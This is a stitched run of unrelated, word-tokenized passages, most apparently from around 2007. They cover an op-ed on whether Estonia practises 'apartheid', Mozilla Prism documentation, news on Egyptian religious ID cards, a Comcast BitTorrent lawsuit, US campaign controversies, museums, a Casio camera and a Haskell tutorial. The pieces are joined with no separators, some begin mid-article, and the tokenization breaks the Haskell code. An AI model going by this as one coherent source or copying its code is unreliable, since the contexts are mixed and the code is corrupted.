Apartheid was the legally enforced separation of the peoples of South Africa , based on race ( or more accurately , skin colour ) .
Mingling of the races , from intermarriage to mixed swimming , was forbidden .
Passed laws meant that blacks could not live in white areas .
Apartheid was backed up by a ruthless secret police that on occasion murdered people , and had no hesitation in enforcing house arrest and exile .
Nazi sympathisers idolise Hitler , think that Jews invented the Holocaust ( or , sometimes , that they deserved what they got ) , and believe that National Socialism was a glorious ideology destroyed by Judaeo - Bolshevism .
Absolutely none of that applies to Estonia .
Not only do the authorities not prohibit contact between Estonians and Russians , they encourage it .
Russians and Estonians mix freely everywhere .
Some of Estonia 's top politicians , including the president and the leader of one of the main political parties have Russian family ties .
Estonians look back on the Nazi occupation with loathing .
Their country was caught between the hammer and the anvil in 1939 , and whatever they did , only suffering and destruction awaited them .
What really annoys the Kremlin crowd is that Estonians ( like many others in eastern Europe ) regarded the arrival of the Red Army in 1944 - 45 not as a liberation , but as the exchange of one ghastly occupation for another .
That flatly contradicts the Kremlin 's revived Stalinist version of history , which puts Soviet wartime heroism and sacrifice at centre - stage , while assiduously obscuring all the historical context .
Given how the Soviet Union treated Estonia in 1939 - 41 , it is hardly surprising that those who fought the occupiers when they returned are regarded as heroes .
But they were not Nazis , nor are those who admire them now .
Given how Soviet Union treated Estonia in 1939 - 41 , it is hardly surprising that those who fought the occupiers when they returned are regarded as heroes
Secondly , Estonians ( like Latvians and Lithuanians ) do not accept that their pre-war statehood was ever extinguished .
Russia may like to think that the Soviet Union magnanimously granted independence to the three “ Soviet Baltic Republics ” in 1991 .
But the Balts see it differently : they regained their independence .
In that view they are confirmed , more or less enthusiastically , by most western countries , which never recognised the Soviet annexation of 1940 , and in some cases continued to accredit Baltic diplomats in dusty and deserted embassies .
On that basis , the hundreds of thousands of Soviet citizens who moved to the Baltic from the 1950s onwards were migrants settling illegally in occupied territories .
Post - Soviet Lithuania granted them citizenship automatically .
But Estonia and Latvia , where the demographic position was more precarious , insisted that they apply for citizenship if they wanted it , and pass a simple test in language and history .
This was not about ethnicity : Russians who lived in Estonia before the occupation ( then around 10 % of the population ) and their descendants regained citizenship automatically .
And it has worked rather well .
Nearly 150,000 people have gained Estonian citizenship ; only 8.5 % remain stateless .
Fifteen years on , Estonia 's policy may be too tough , or just right , or even too lax .
Compared to most European countries ' citizenship laws , it is quite generous .
In any event , calling it “ apartheid ” is not only nonsensical , but stupidly insulting , to a country that has responded with intelligence and restraint to a devastating historical injury .

Warning : Prism is no longer developed by Mozilla Labs , although this documentation will still be useful to those using WebRunner ( see next paragraph ) .
There are now two alternatives :
The Prism code was picked up by Matthew Gertner who started a company to continue its open source development under the name WebRunner .
See his blog post at http://www.salsitasoft.com/blog/2011/02/09/prism-is-now-webrunner/
Mozilla Labs itself started a new project called Chromeless .
See their blog post at http://mozillalabs.com/blog/2011/02/prism-is-now-chromeless/
Prism is a simple XULRunner based browser that hosts web applications without the normal web browser user interface .
Prism is based on a concept called Site Specific Browsers ( SSB ) .
An SSB is an application with an embedded browser designed to work exclusively with a single web application .
It does n’t have the menus , toolbars and accoutrements of a normal web browser .
Some people have called it a " distraction free browser " because none of the typical browser chrome is used .
An SSB also has a tighter integration with the OS and desktop than a typical web application running through a web browser .
Prism / SSB Objectives
Looking at what has already been done and discussed about desktop / webapp integration , the following is a suggested roadmap for SSB experimentation :
Separate process :
When the webapp goes down or locks up , I do n’t want anything else affected .
Thankfully , Firefox does have session restore , but that is beside the point .
When I open many tabs and have several webapps running in a browser , things get slow and unstable after a day or two .

Minimal UI : A generic browser UI is not needed for webapps .
If any UI is present , make it specific to the webapp I am using .

Basic desktop integration : Create shortcuts to start the webapp , add ability to show specialized icons in the tray or dock and ability to display notifications .
Create shortcuts to start the webapp , add ability to show specialized icons in the tray or dock and ability to display notifications .
Platform with extensions : I do n’t want to download a full browser runtime for each webapp .
I do want to be able to add some custom code / features that are not directly supported in the webapp .
I should be able to install one runtime and then get packages or extensions for each webapp .
Think Firefox extensions or Greasemonkey scripts .
These extensions should be able to tweak the SSB UI as well .

Open external links in real browser :
If I click a link in the webapp that opens a new site , do n’t change my webapp browser window .
Open all external links in my default / real browser .
Current Features
Window title tracking
Context menu for basic clipboard and selection operations
Simple Print support via context menu
About support via context menu which is useful for checking the XULRunner runtime version
Launch Prism with commandline parameters to host specific webapps
Web application profile support - parameters for a web app can be saved to an INI - style *. webapp file
Support for webapp owned popup windows - some email webapps can use a popup to compose email
Show float - over link destinations in the statusbar so users can see where the link will take them
Support download manager
Support for inline spellcheck and suggestions on context menu
A tool to create new webapp profiles so new webapps can be installed from Prism
An extension to allow Firefox to create webapp profiles since most of this process starts in the browser
Wishlist
Add Taskbar icon representation option for the web applications .
Make all link open in it 's own app ( eg. Facebook Prism app will force all facebook link from any other app to open in this app )
Add one instance behavior in order for the shortcuts to bring the web app to view rather than open a second window .
Add menus for page setup , open profile and work offline
Add support for form field autocompletion , like Firefox
Enable extension support so Prism can be tweaked or enhanced .
Also , webapps themselves can be tweaked by extensions
Create some form of adjusting preferences ( about : config ? ) .
For instance , I had to add the code below in webruner - prefs.js to adjust proxy
using a parameter in the . webapp file would be the best solution :
but you could also have a sort of " Registry Editor " webapp ( just create one with about : config as the URL - - maybe keep it in the Prism shortcuts , rather than the webapp ones )
Add url / domain / subdomain restriction ( external links wo n't work ) give more detail on the discussion page
Add ability to open external links with other browsers ( Firefox / Konqueror / IE / etc. ) this should be working now - give more detail on the discussion page
Add ability to have entire software and webapp run from a USB memory device for roaming use .
Possibility of full screen mode
Find box
Use webpage ( favicon ) icon instead of prism icon
Navigation with Alt + mouse scroll wheel is working , even if navigation is disabled in webapp.ini .
Maybe it should be like in firefox
Shift + mouse scroll wheel when navigation is enabled .
Navigation with mouse gestures .
A left - click , hold and move cursor to the left would signify a Back page request on a left - click , hold and move cursor to the right would be forward .
Others such as to the top left corner to signify minimize window .
This would enable the use of touch - screen kiosks without keyboard or mouse attached .
More robust command line handling .
It would be nice be able to simply type one of these :
webrunner gmail.webapp webrunner https://mail.google.com/mail - Nope
Updater like firefox that tells you when a new version of webrunner has been released .
Add something to configure and block advertisement .
Back , forward ( history ) and reload buttons are necessary .
Support for increasing and decreasing text size ( ctrl + + and ctrl --)
Menu option - ' Preferences '
Option to load " sidebar services " , what I mean by this is the option to load services which are meant to load in sidebar ( google Chat and google Notebook have specific webpages for the sidebar for example ) and which will load in prism as a fixed size window on the left of the screen ( and best would be that maximized windows will stay right of it )
Configuration option to sandbox a webapp so it does n't share cookies with other webapps in the same Prism .
This could allow multiple Google apps to be open with different accounts ( a@gmail.com Gmail ; b@msn.com for Reader ; c@hostedgmail.com for Hosted Gmail ) . ( more at gnucitizen.org )
Detection of window close ( user clicks the X button ) with JavaScript .
Existing ways to detect browser closure are not reliable and in the context of an app it is essential .
Detection of window minimize / restore might be useful as well ( like in a real desktop app ... )
Better shell integration :
Most options should be accessible via command line and -- help should print out something usable .
Add ability to configure / clear private data ( cookies , history , passwords , etc . )
NTLM Authentification like " network.automatic-ntlm-auth.trusted -uris " in Firefox
Minimize to system tray with balloon notifications
Enable selecting spell checker 's language in context menu , or guess it based on LANG environment variable and lang html attribution .
( As of 0.8 it always uses US English . )
Make it possible for the website developer to specify a menu structure in the host window for the normal menu- bar in the top of an application .
The website developer should be able to specify the supported configuration of prism , e.g. enable / disable sidebar service , preferred sidebar url , icon , etc .
This will remove the need for the decentralized .app file .
The website developer should be able to specify the preferred / minimum size of the host window .
Security for use in Computer - Based Exams - Traagoob - 19 July 2008
A toggle - option that locks down the SSB to a registered domain name .
For example , an SSB set to w3schools.com would allow links to any higher - level domain name ( e.g. , www.w3schools.com) or folder ( e.g. , www.w3schools.com/xml/), but not allow vectoring to another domain name such as google.com .
Currently , an SSB set to w3schools.com will vector to www.google.com if the user enters that url into the site 's site - search box .
At that point the examinee is free to explore unauthorized sites during the examination .
A toggle - option to restrict starting a regular browser .
This is possible if the directory names for the regular browsers are modified , but it would be nicer if the SSB could manage this .
To be able to set the window height and width via the configuration file , as well as set the border type ( dialog , sizeable , none ? , etc ) .
I believe the windowsize could be set in the webapp.js though I think it would be more appropriately set within the webapp.ini
Web Application Bundles
A web application bundle is a zip archive that holds a configuration file , icons and an optional webapp JS script .
The profile can be used to launch and install the webapp in Prism :
prism - webapp [ webapp - bundle ]
Whenever a web application has been launched / installed using the above command line and the webapp configuration has an ID parameter , the web application is unpacked into the Prism profile folder and can be launched directly using :
prism - webapp [ webapp-id ]
Here is a simple how - to for building a basic web application bundle .
See : Prism / Bundle
Web Application Configuration
A webapp bundle should contain a webapp.ini configuration file .
The configuration file is a simple , INI - style text file that specifies some parameters about a web application .
See : Prism / Config
Web Application Script
Some Prism - based web applications may want to tweak the behavior or add desktop - ish features to the webapp .
Prism supports a simple scripting system that can be used to add custom JS script to the Prism chrome host , but not the webcontent itself .
In the future , the webapp script may have lower privileges .
We are looking into the security aspects of the higher privilege level .
See : Prism / Scripting
Web Application Styling
One of Prism 's goals is to make web applications feel more like desktop applications .
One way to make the illusion seem more real is to use styling ( or theming ) .
Prism supports a simple styling system that allows the user to add CSS files to the webapp bundle .
See : Prism / Styling
Prism Host Window
Prism provides a simple , scaled down browser window for running web applications .
Using configuration files and webapp scripting , the host window can be modified .
See : Prism / HostWindow
Installer
The installer should configure the OS to associate *. webapp files with Prism .
This means that when you double - click or launch a *. webapp file , Prism is launched and automatically opens the web application .
Current Windows and Mac installs automatically associate *. webapp with Prism .
One interesting side effect is that after this change , you can select a link to a . webapp file in a Web Page and you get it run by Prism - in IE this runs anywhere , but this wo n't work in Firefox unless the webapp is being issued with an appropriate MIME type on the server : application / x- webrunner works ( see here for an example ) .
Installs
Prism is available as an extension for Firefox 3 or as a standalone application .

Bahais are not recognised in all - important Egyptian ID papers
Egyptians over 16 must carry ID cards showing religious affiliation .
Muslim , Christian and Jew are the only choices .
Human Rights
Watch says the requirement particularly hits members of the small Bahai community , and Coptic Christians who became Muslims but want to go back .
It says there are about 200 such people who converted for reasons like divorce .
The BBC's Heba Saleh in Cairo says that without the all - important IDs , members of minorities face enormous problems in education and employment .
Ministry of interior officials apparently believe that they have the right to choose someone 's religion
Joe Stork , Human Rights Watch
These are mostly members of Christian families whose fathers converted to Islam and left them .
When the children get their ID cards they find they have been listed as Muslims whether they like it or not .
' Arbitrary refusal '
The report is jointly issued by HRW and the Egyptian Initiative for Personal Rights .
" Ministry of interior officials apparently believe that they have the right to choose someone 's religion when they do n't happen to like the religion that person , him or herself , has chosen , " said Human Rights Watch 's Joe Stork .
" So we are asking the government today to end this arbitrary refusal to recognise someone 's actual religious beliefs , " he said .
Egypt is a predominantly Sunni Muslim state .
Conversions from Islam are viewed as apostasy , although Muslim scholars differ on the what action should be taken .
Egypt's Supreme Administrative Court is shortly to rule on whether seven Christian - to - Muslim converts who converted back can be recognised as Christians .
A ruling is also expected on whether the government must recognise minority Bahais .
A California man filed suit in state court Tuesday against internet service provider Comcast , arguing that the company 's secret use of technology to limit peer - to - peer applications such as BitTorrent violates federal computer fraud laws , their user contracts and anti-fraudulent advertising statutes .
Plaintiff Jon Hart , represented by the Lexington Law Group , argues that Comcast 's promises of providing internet connections that let users " Download at Crazy Fast Speeds " are false and misleading since Comcast limits downloads by transmitting " unauthorized hidden messages to the computers of customers " who use peer - to - peer file sharing software .
Hart wants the court to force Comcast to stop interfering with the traffic .
He also wants the court to certify the suit as a class action and force Comcast to pay damages to himself and all other Comcast internet subscribers in California
The suit ( .pdf ) , which also claims the BitTorrent blocking is an unfair business practice , was filed in California Superior Court in Alameda County .
Defendants have disseminated and continues to disseminate advertising , that they know or should reasonably know is false and misleading .
This conduct includes , but is not limited to , promoting and advertising the fast speeds that apply to the Service without limitation , when , in fact , Defendants severely limit the speed of the Service for certain applications .
It further includes Defendant 's misrepresentations that their customers will enjoy " unfettered access " to all internet applications , when , in fact , Defendants not only fetter certain applications , but completely block them .
Defendants know or reasonably should know that this advertising is false and misleading .
In the suit , Hart says he upgraded to Comcast 's Performance Plus service in September specifically to use the " blocked applications , " and that nothing in the 22 - page terms of agreement with Comcast indicated that the company throttles traffic .
Though Comcast has yet to see the suit , Comcast spokesman Charlie Douglas pointed THREAT LEVEL to the company 's FAQs about its traffic shaping and issued the following statement
Comcast does not , has not , and will not block any websites or online applications , including peer - to - peer services .
Our customers use the Internet for downloading and uploading files , watching movies and videos , streaming music , sharing digital photos , accessing numerous peer - to - peer sites , VOIP applications like Vonage , and thousands of other applications online .
We have a responsibility to provide all of our customers with a good Internet experience and we use the latest technologies to manage our network so that they can continue to enjoy these applications .
Comcast refuses to plainly explain what it does to control BitTorrent traffic , but independent analyses have shown that Comcast is severely throttling internet traffic that is using the popular file sharing protocol BitTorrent by sending fake " I'm finished " messages to users ' BitTorrent programs .
Those fake packets are also alleged to affect users of the mainstream business application Lotus Notes .
The lawsuit charges those fake packets violate the federal Computer Fraud and Abuse Act .
The BitTorrent protocol is used for sharing large files – from pirated films to open - source OSs – by having downloaders also serve as uploaders , even when they have only downloaded a portion of the file .
Though almost nothing is publicly known about aggregate internet traffic , BitTorrent protocol traffic is often estimated to constitute 35 % to 40 % of internet traffic .
ISP discrimination against certain kinds of traffic also violates established Federal Communications Commission policies on Net Neutrality , the suit argues .
Comcast has yet to be served with the suit , according to Lexington Law Group attorney Mark Todzo .
The firm is waiting to get an official copy of the suit back from the court and expects to serve Comcast later this week .
Comcast will then have 30 days to answer the complaint or seek dismissal of the suit .
The case is Hart v. Comcast .
UPDATE : Comcast was working on an answer to THREAT LEVEL 's questions when the story was posted , and their response was added as soon as the company got back to us .

But not every institution , particularly the community - based sites that make up around 80 percent of history museums in the country , can afford to stop at nothing to attract a crowd .
More to the point , should they ?
“ Sometimes I think what we might call the bells and whistles go too far , ” said James M. McPherson , the Pulitzer Prize - winning historian who serves as an adviser to both the Gettysburg Foundation and the American Civil War Center .
But even Mr. McPherson , a crusader for the preservation of historical sites , does not deny the benefits of mixing entertainment with education in the museum field .
“ The positive feeling is that it seems to be very successful in attracting visitors and viewers from all age levels and all kinds of backgrounds of historical knowledge , ” he said .
“ I do n’t really know whether it works , but if 3,000 people a day are going to the Lincoln Museum , and if even 1 percent are inspired by Lincoln , it may be having a positive impact . ”
While the American Civil War Center draws on new technologies in its inaugural exhibition , as will the Gettysburg visitor center when it opens next year , the results are more subtle , melding images with words to poignant effect .
Mr. McPherson said he hopes this approach proves as emotionally and intellectually stimulating as the more flamboyant exhibitions .
It is a constant refrain repeated by historians , curators and directors :
After all the stops are pulled out , they insist , the museum is finally about the story and about finding a better way to present it to the generations in whose hands the fate of these museums rests .
“ All museums are looking for ways to attract generation Xers and Yers , and the reasons for that are pretty simple , ” said Ms. Davis of the American Association for State and Local History .
“ That ’s the generation that ’s going to be their larger share , not just as visitors but as board members and donors .
Those are the people who are going to sit in the seats and make decisions for the future of museums . ”
A video criticizing Republican presidential contender Rudy Giuliani for fundraising in California instead of participating in a debate focusing on social issues facing the black and Hispanic communities is becoming an online audience favorite .
The online video , Rudy Skips Minority Debate to Fundraise with Bo Derek is " spreading across the interweb like wildfire , " according to Unruly Media 's Viral Video Chart .
As of Monday morning , the 80 - second spot was at the top of the tracking - site election category , having been viewed more than 45,000 times , with the number quickly rising .
The video was created by Brave New Films , a film production studio founded by liberal activist Robert Greenwald .
Greenwald first sent out e-mail about the video on Saturday .
The Thursday debate was organized and moderated by PBS ' late - night talk show host Tavis Smiley and held at Baltimore 's Morgan State University .
The Republican presidential candidates were invited to address pressing issues facing blacks and Hispanics .
Several of the leading Republican contenders , including Giuliani , skipped the debate , citing scheduling conflicts .
Former Tennessee senator Fred Thompson ; Arizona senator John McCain ; and former Massachusetts ’s governor Mitt Romney also did not attend .
The video seeks to answer the question of what Giuliani was doing instead of participating in the debate .
It features shots of Giuliani fundraising in Southern California with former California governor Pete Wilson in a sparsely attended press conference .
And it pointedly notes that he was raising money from celebrities such as Bo Derek and Dennis Miller .
The video then spliced in rival presidential contender Mike Huckabee at the PBS debate saying that he was " embarrassed for those who did not come . "
Giuliani , now a front - runner in the race for the Republican nomination , has become a focal point for Greenwald 's online viral video efforts in the past month .
Brave New Films in early September launched an anti-Giuliani site , and at the same time released an online video that criticized the former mayor for placing New York 's emergency response command center in the World Trade Center .
That video has been viewed more than 247,000 times , according to YouTube statistics .
In early July , the International Association of Fire Fighters used YouTube to release a 13 - minute documentary that also criticized Giuliani 's response to Sept. 11 .
That video has been viewed 280,000 times .
Giuliani responded to that video at the time with a press release containing facts rebutting the claims the IAFF made in the video .
But Matt Lewis , a contributing writer and director of operations for the conservative Townhall.com , says that tactic wo n't be effective over time .
He believes Giuliani needs to respond via his own online video rebuttals in order to convey the same level of emotional intensity that makes the criticisms compelling to online viewers .
" These videos in and of themselves are n't that big of a deal , " he says .
" The first punch is n't a devastating blow , but a series of punches un - responded to could create a new , damaging narrative " about Giuliani 's candidacy , possibly reshaping voters ' perceptions of the candidate .
While in Tokyo for CEATEC , I made the pilgrimage to Casio headquarters and geeked out at their museum .
I saw the world 's first electronic calculator ( about the size of a toaster oven ) and also the first digital camera with — if you can believe it — an LCD screen on the back .
But my real purpose was to meet with the father of that old camera , Jin Nakayama , to see his latest offspring .
It 's so new , in fact , they have n’t chosen a name yet .
But it ’s the wildest camera I 've ever seen .
By mating a high - performance CMOS image sensor with a new , lightening - fast processor , the camera can shoot up to 60 ( yes , 60 ) six - megapixel photos per second or — get this — 300 video frames per second .
That ’s National Geographic - style slow - mo video from a consumer camera .
Well , if Casio goes ahead and builds a consumer camera .
For now , it ’s just a science experiment .
But the prototype I saw looks pretty darn close to a real product .
Enough talking .
If a picture 's worth a thousand words , this 300 - picture - per - second clip of me drinking water is the Magna Carta .

Word numbers , Part 3 : Binary search
We return to ITA Software ’s “ word numbers ” problem , continuing our work in part 1 and part 2 .
As before , you can download this post as a program .
{-# OPTIONS - W - fglasgow - exts #-} module WordNumbers3 where import WordNumbers1 import WordNumbers2 import Prelude hiding ( (+ ) , ( * ) , sum , product ) import qualified Prelude as P import Data .
List ( genericSplitAt , genericLength )
We left off in part 2 with a program that could quickly compute the total number of characters produced in any grammar .
We will use that program in this part to locate exactly where in the production the nth letter is , in order to solve the following slightly easier version of the puzzle :
If the integers from 1 to 999,999,999 are written as words in order and concatenated , what is the 51 billionth letter ?
( The alphabetical sorting was dropped . )
This version has appeared in some of ITA Software ’s ads .
We solve this one by keeping track a binary tree corresponding to the productions in the grammar , computing the total length of each production and doing a search in this tree .
data Binary m = Binary m ( Maybe ( Binary m , Binary m ) )
Characters create leaf nodes —
instance ( Character m ) =>
Character ( Binary m ) where char c = Binary ( char c ) Nothing
— and addition ( i.e. , alternate possibilities in the grammar ) creates a branch .
instance ( Monoid m ) => Monoid ( Binary m ) where zero = Binary zero Nothing b1 @ ( Binary m1 _ ) + b2 @( Binary m2 _ ) = Binary ( m1 + m2 ) ( Just ( b1 , b2 ) )
Note that the addition operation is not commutative .
This is impossible in a ring : in any ring the addition is necessarily commutative .
( Exercise ! )
But this does not hold in general for a semiring ( with no subtraction ) or , more severely , for a semiring or seminearring ( which only has one of the two distributive laws ) .
This is fortunate for us , since we want to be sure to keep the productions in order .
The multiplication operation is a little more subtle , since we multiply two trees , either of which may branch .
We use left - to - right evaluation , taking by preference the branches of the left tree .
instance ( Seminearring m ) =>
Seminearring ( Binary m ) where one = Binary one Nothing b1 @ ( Binary m1 c1 ) * b2 @( Binary m2 c2 ) = Binary ( m1 * m2 ) ( case c1 of Just ( b11,b12 ) -> Just ( b11*b2 , b12*b2 ) Nothing -> case c2 of Nothing -> Nothing Just ( b21,b22 ) -> Just ( b1*b21 , b1*b22 ) )
Since in English the most significant digits are always on the left , the resulting order of the leaves of the tree constructed for ten9 will be the usual numerical order .
If we were working in a language where the least significant digits were stated first , we would need right - to - left evaluation , or we could go to a more general solution like the one we will later give for alphabetical sorting .
We will use these trees to keep track of the count and volume of the productions ( as in part 2 ) , as well as the list of strings ( so that we can see what letter we get ) .
type Measure = ( [ String ] , Deriv Count Volume )
We treat the pair component - wise .
instance ( Monoid a , Monoid b ) => Monoid ( a , b ) where zero = ( zero , zero ) ( a1,b1 ) + ( a2,b2 ) = ( a1+a2 , b1+b2 ) instance ( Seminearring a , Seminearring b ) =>
Seminearring ( a , b ) where one = ( one , one ) ( a1,b1 ) * ( a2,b2 ) = ( a1 * a2 , b1*b2 ) instance ( Character r1 , Character r2 ) =>
Character ( r1 , r2 ) where char c = ( char c , char c )
The binary search is now straightforward to write .
volume :: Deriv Count Volume ->
Integer volume ( Deriv _ ( Wrap ( Nat v ) ) ) = v search :: Binary Measure -> Integer ->
Measure search ( Binary m Nothing ) _ = m search ( Binary _ ( Just ( c1 @ ( Binary ( _ , skip ) _ ) , c 2 ) ) ) i | i' < 0 = search c1 i | otherwise = let ( s , m ) = search c2 i' in ( s , skip + m ) where i' = i - volume skip
For the answer , we return the target letter as well as its context .
answer n = ( before , it , after ) where target = pred n ( [ string ] , d ) = search ten9 target end = volume d ( before , it : after ) = genericSplitAt local string local = genericLength string - ( end - target )
We can now quickly solve the problem …
* WordNumbers3 > answer 51000000000 ( " sevenhundredthirtytwomil " , 'l ' , " ionsevenhundredninetysixthousandthreehundredsixtysix " )
… and check a few small values to be sure there are no off by one errors .

CNN Poll : 88 % say Rep. Stark should not apologize David Edwards and Muriel Kane
Published : Friday October 19 , 2007

This CNN is reporting that 88 % of those voting in their Friday morning online poll say there is no reason Rep. Pete Stark ( D - CA ) should apologize for remarks blasting President Bush on the floor of the House of Representatives .
In the course of debate on expanding SCHIP funding , Stark told Congressional Republicans ( video , story ) , " You do n't have money to fund the war or children .
But you 're going to spend it to blow up innocent people , if we could get enough kids to grow old enough for you to send to Iraq to get their head 's blow off for the president 's amusement . "
House Minority Leader Rep. John
Boehner quickly issued a statement demanding a retraction and apology , in which he said , " Our troops in Iraq are fighting against al - Qaeda and other radical jihadists hellbent on killing the people we are sent here to represent .
Congressman Starks statement dishonors not only the Commander - in - Chief , but the thousands of courageous men and women of Americas armed forces who believe in their mission and are putting their lives on the line for our freedom and security . "
There has predictably been support for Stark on the left , along with endorsements of Boehner 's outrage on the right .
A thread at the liberal Democratic Underground site asked members to " DU this CNN poll ! " but also expressed amusement that the sentiment in favor of Stark was already running at 87 % to 13 % .
One commenter suggested that " the poll has been Freeped , it was 89 % before , now it 's 87 % , " to which another replied " amazing what consitutes freeping these daze . "
" Freeping " is a reference to the practice initiated at the conservative Free Republic message board some years ago of sending members to overwhelm online polls with indications of support for right - wing policies and politicians .
Liberal sites like Democratic Underground and Daily Kos then began countering this strategy with similar exhortations of their own .
The lopsided result of the CNN poll is striking , especially since the mainstream consensus seems to be that even if Stark was just shooting his mouth off , as he has many times in the past , he may have crossed a line of bad taste in suggesting that the president actively enjoys seeing American soldiers ' heads blown off .
For example , when Keith Olbermann indicated on his program that he felt there was " something refreshing about his at least refusal to back down , " guest Jonathan Alter responded that Stark 's comments were " silly and counterproductive , and the best thing for him to do would be to apologize and move on . "
MSNBC's " First Read " blog eneumerated Stark 's history of inflammatory remarks : " On another occasion he publicly questioned the provenance of J.C. Watts ' offspring , comments that so enraged the former Oklahoma quarterback that he angrily marched up to Stark on the House floor and had to be restrained from beating the living daylights out of the 70 - something liberal .
Also , during a gun control debate some years back , Stark suggested that opponents of gun control were phallically challenged .
And not too long ago , he called a GOP opponent on the Ways and Means committee a ' fruitcake ' during committee proceedings . "

Fiery Republican presidential long - shot Tom Tancredo has defended his suggestion that America should threaten to bomb Muslim holy sites in order to deter a nuclear attack on US soil .
Mr Tancredo first mooted his controversial position last week , prompting the State Department to describe it as " absolutely crazy . "
" Yes , the State Department -- boy , when they start complaining about things I say , I feel a lot better about the things I say , " the Colorado representative said in a presidential debate in Iowa televised on American ABC .
" My task as president of the United States is primarily to do one thing - by the way , not to make sure everybody has health care or everybody 's child is educated - my task is to do one thing : to protect and defend this country .
" And that means to deter - and I want to underline ' deter ' - any kind of aggression , especially the type we are threatened with by Al Qaeda , which is nuclear attack .
" I'm telling you right now that anybody that would suggest that we should take anything like this off the table in order to deter that kind of event in the United States is n't fit to be president of the United States . "
The State Department on Friday reacted angrily to Tancredo 's initial comments .
" Let me just say that it is absolutely outrageous and reprehensible for anyone to suggest attacks on holy sites - whether they are Muslim , Christian , Jewish or those of any other religion , " departmental spokesman Tom Casey said .
Tancredo was quoted by the Iowapolitics.com website last week as saying the best way he could think of to deter a nuclear terrorist attack on the United States was to threaten to retaliate by bombing Islamic holy sites .

As of this writing , Alberto Gonzales ' successor appears to be Michael Mukasey , a former longtime federal judge who has received plaudits from many in the legal profession , including defense lawyers who have sparred with him during trials involving national security .
Not wanting the normally fiercely partisan confirmation hearings , President Bush chose Mukasey , whom many in Congress welcomed as a " consensus nominee . "
I am neither a Republican nor , anymore , a Democrat .
My vote depends on any public official 's history of commitment regarding the Constitution .
In an August op - ed in The Wall Street Journal , Mukasey wrote - troubling to me - that in warring against terrorism , " current institutions are not well - suited , " so Congress must " fix a strained and mismatched legal system . "
This asserted need to revise our rule of law has been the Bush - Cheney administration 's ardent view since soon after 9/11 .
Their adjusting our legal system has produced in the Justice Department ( and other agencies ) rationalizations for warrantless surveillance of American citizens ; the CIA 's secret prisons ( " black sites " impossible to find in the Constitution ) ; and the denial by the president and Congress ( 2006 Military Commission Act ) of habeas corpus rights to terrorism suspects , despite a Supreme Court ruling to the contrary .
During a 2004 article in The Wall Street Journal , Mukasey argued that while the Constitution 's first 10 amendments ( the Bill of Rights ) are noble , if you give constitutional prominence to these rights of individuals AGAINST the government , " then citizens will feel much less inclined to sacrifice in behalf of their government . "
( Sacrifice their individual liberties ? )
In that same article , he added - as the Bush administration also has with regard to these perilous times - " at least in the first instance , " citizens should give the government " the benefit of the doubt . "
( The most secretive government in our history ? )
Should the president get the benefit of the doubt when he - more often than any of his predecessors - adds " signing statements " to the bills he has signed into law , saying he will not obey certain provisions if , in his sole opinion , they endanger national security ?
Mukasey 's predecessor , Gonzales , saw nothing wrong with these signing statements , which supposedly smoothes out our " strained legal system . "
Does the next attorney general agree with this exercise of unitary executive power ?
When Washington Post reporter Dana Priest reported on secret CIA " renditions " of terror suspects to countries known for torturing their prisoners and then went on to reveal the existence of classified CIA secret prisons in Eastern Europe , Gonzales began a criminal investigation of her .
Nonetheless , for that reporting , Priest was awarded the Pulitzer Prize .
Does the next attorney general consider the Pulitzer Board as having been unpatriotic ?
Gonzales revived prosecution under the Espionage Act in a case that also includes journalists and still is in the courts .
Would Mukasey use the Espionage
Act against reporters whose stories include any kind of classified information ?
This administration , more than any others in the past , has used the " state secrets " privilege to prevent certain cases from even being heard in our courts on the grounds of national security .
What will be the new attorney general 's criteria be in deciding when to deny this fundamental due process in cases also including American citizens ?
Mukasey has expressed support for the Patriot Act .
Does that include the expansion in the 2006 congressional revisions of the FBI 's powers to obtain private personal records from Internet and telephone companies , banks and other sources without a court warrant ?
Judge Victor Marrero , in a recent Federal District Court decision , called the FBI 's secret national security letters - harvesting information about persons not allowed to be told it 's happening - " the hijacking of constitutional values . "
Last year , the Supreme Court , in Hamdi v. Rumsfeld , ruled that with regard to the prisoners at Guantanamo Bay and other detainees , Common Article 3 of the Geneva Conventions ( which this nation has signed ) must apply .
Article 3 requires that detainees be tried " by a regularly constituted court , affording all the judicial guarantees which are recognized as indispensable by civilized people . "
Does Mukasey , an adviser to Rudy Giuliani 's campaign , believe the president 's military commissions at Guantanamo - at which the detainees cannot have nonmilitary lawyers and cannot see all the evidence against them - meet this Supreme Court definition ?
If he disagrees as the nation 's chief law enforcement officer , what action will he take ?
He could continue as attorney general if Giuliani wins .
Finally , in the long war on terror , does he regard it necessary , in certain situations , to limit the constitutional separation of powers to defer to an " inherent constitutional power " of the president ?
The recording industry has continued to ratchet up its war against peer - to - peer file sharing , and lately it has been working overtime to draft universities into the fight .
Some universities have responded to this pressure by deploying a variety of sticks and carrots .
For example , we reported last month on a new University of Kansas policy that students would be kicked off the campus network permanently the first time they were caught using file - sharing software .
In a recent roundup , MTV reported that UC - Berkeley and Harvard will also begin imposing heightened penalties for students caught engaging in file sharing .
Other colleges are focusing more on carrots , by automatically signing students up for legit ( if DRM - encumbered ) download services like Ruckus and Rhapsody in hopes of deterring students from breaking the law .
But these efforts have apparently not pacified the recording industry .
Last month , Senate Majority Leader Harry Reid proposed an amendment to the Higher Education
Act that would have required schools with large numbers of file - sharing complaints to report to the federal government on their anti-piracy efforts and to implement " a technology - based deterrent to prevent the illegal downloading or peer - to - peer distribution of intellectual property . "
The proposal was shelved after universities raised concerns over its costs , but expect it to be brought up again in the future .
The decision to single out institutions of higher education is troubling .
To be sure , peer - to - peer copyright infringement is a common occurrence on college campuses .
But universities are simply acting as Internet service providers , and it's well - established that the Digital Millennium Copyright
Act shields ISPs from liability for the infringing activities of their users provided that they promptly remove infringing material once they have been notified of its existence .
That rule has served us well over the last decade , and it should n't be changed without a good reason .
And if the DMCA 's safe harbor rules are going to be changed , they should be changed for all ISPs rather than singling out one category of ISPs for heightened liability .
Singling out universities is particularly troubling because universities are devoted to academic freedom and the flow of information .
That does n't mean that universities should condone lawbreaking , but it certainly seems incongruous to require universities to snoop on their users more than commercial ISPs .
It 's also not clear why — aside from intensive lobbying by the recording industry — Congress would want to single out file - sharing as a problem in particular need of government - mandated snooping .
People can engage in all manner of illegal activities online — online gambling , trading child pornography , spamming , or planning terrorist attacks .
While illicit file - sharing is certainly a problem , it 's hardly the most serious crime being committed online .
Collective licensing
A better solution is the one proposed by the Electronic Frontier Foundation in a recent report : instead of transforming college campuses into a miniature surveillance state , record labels and universities could enter into a collective licensing agreement under which the university would pay a flat fee to the record labels in exchange for the right to utilize peer - to - peer applications on campus .
